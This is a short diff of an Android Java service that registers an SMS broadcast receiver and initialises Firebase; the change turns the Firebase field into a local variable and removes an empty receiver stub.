@@ -11,14 +11,13 @@ import com.google.firebase.FirebaseApp;
 import com.google.firebase.database.annotations.Nullable;
 
 public class MyService extends Service {
-    private FirebaseApp firebaseApp;
     private BroadcastReceiver smsReceiver;
 
     @Override
     public void onCreate() {
         super.onCreate();
         // Initialize Firebase
-        firebaseApp = FirebaseApp.initializeApp(this);
+        FirebaseApp firebaseApp = FirebaseApp.initializeApp(this);
 
         // Register the BroadcastReceiver
         smsReceiver =new SmsReceiver();
@@ -45,12 +44,5 @@ public class MyService extends Service {
         return null; // No binding required for this example
     }
 
-    private static class MyBroadcastReceiver extends BroadcastReceiver {
-        @Override
-        public void onReceive(Context context, Intent intent) {
-            // Handle received broadcast here
-            // Use Firebase services to send the received messages
-        }
-    }
 }
 
